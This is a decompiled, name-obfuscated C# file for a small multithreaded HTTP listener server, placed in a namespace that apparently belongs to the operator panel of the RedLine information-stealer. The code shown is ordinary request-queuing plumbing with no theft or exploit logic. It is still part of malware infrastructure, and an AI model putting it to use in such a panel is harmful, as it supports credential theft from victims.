using System;
using System.Collections.Generic;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;

namespace RedLine.MainPanel;

internal class GuestHttpServer : IDisposable
{
	private readonly object object_0;

	private readonly object object_1;

	private readonly object object_2;

	private readonly object object_3;

	private readonly object object_4;

	private object object_5;

	[CompilerGenerated]
	private object object_6;

	public event Action<HttpListenerContext> ProcessRequest
	{
		[CompilerGenerated]
		add
		{
			Action<HttpListenerContext> action = (Action<HttpListenerContext>)object_6;
			Action<HttpListenerContext> action2;
			do
			{
				action2 = action;
				Action<HttpListenerContext> value2 = (Action<HttpListenerContext>)Delegate.Combine(action2, value);
				action = Interlocked.CompareExchange(ref System.Runtime.CompilerServices.Unsafe.As<object, Action<HttpListenerContext>>(ref object_6), value2, action2);
			}
			while ((object)action != action2);
		}
		[CompilerGenerated]
		remove
		{
			Action<HttpListenerContext> action = (Action<HttpListenerContext>)object_6;
			Action<HttpListenerContext> action2;
			do
			{
				action2 = action;
				Action<HttpListenerContext> value2 = (Action<HttpListenerContext>)Delegate.Remove(action2, value);
				action = Interlocked.CompareExchange(ref System.Runtime.CompilerServices.Unsafe.As<object, Action<HttpListenerContext>>(ref object_6), value2, action2);
			}
			while ((object)action != action2);
		}
	}

	public GuestHttpServer(int maxThreads)
	{
		object_2 = new Thread[maxThreads];
		object_5 = new Queue<HttpListenerContext>();
		object_3 = new ManualResetEvent(initialState: false);
		object_4 = new ManualResetEvent(initialState: false);
		object_0 = new HttpListener();
		object_1 = new Thread(method_0);
	}

	public void Start(string adress, int port)
	{
		((HttpListener)object_0).Prefixes.Add($"http://{adress}:{port}/");
		((HttpListener)object_0).Start();
		((Thread)object_1).Start();
		for (int i = 0; i < ((Array)object_2).Length; i++)
		{
			((object[])object_2)[i] = new Thread(method_2);
			((Thread)((object[])object_2)[i]).Start();
		}
	}

	public void Dispose()
	{
		Stop();
	}

	public void Stop()
	{
		((EventWaitHandle)object_3).Set();
		((Thread)object_1).Join();
		Thread[] array = (Thread[])object_2;
		for (int i = 0; i < array.Length; i++)
		{
			array[i].Join();
		}
		((HttpListener)object_0).Stop();
	}

	private void method_0()
	{
		try
		{
			while (((HttpListener)object_0).IsListening)
			{
				IAsyncResult asyncResult = ((HttpListener)object_0).BeginGetContext((AsyncCallback)method_1, (object)null);
				if (WaitHandle.WaitAny(new WaitHandle[2]
				{
					(WaitHandle)object_3,
					asyncResult.AsyncWaitHandle
				}) == 0)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	private void method_1(object ar)
	{
		try
		{
			lock (object_5)
			{
				((Queue<HttpListenerContext>)object_5).Enqueue(((HttpListener)object_0).EndGetContext((IAsyncResult)ar));
				((EventWaitHandle)object_4).Set();
			}
		}
		catch
		{
		}
	}

	private void method_2()
	{
		try
		{
			WaitHandle[] array = new ManualResetEvent[2]
			{
				(ManualResetEvent)object_4,
				(ManualResetEvent)object_3
			};
			WaitHandle[] waitHandles = array;
			while (WaitHandle.WaitAny(waitHandles) == 0)
			{
				HttpListenerContext obj;
				lock (object_5)
				{
					if (((Queue<HttpListenerContext>)object_5).Count > 0)
					{
						obj = ((Queue<HttpListenerContext>)object_5).Dequeue();
						goto IL_0064;
					}
					((EventWaitHandle)object_4).Reset();
				}
				continue;
				IL_0064:
				try
				{
					object_6(obj);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
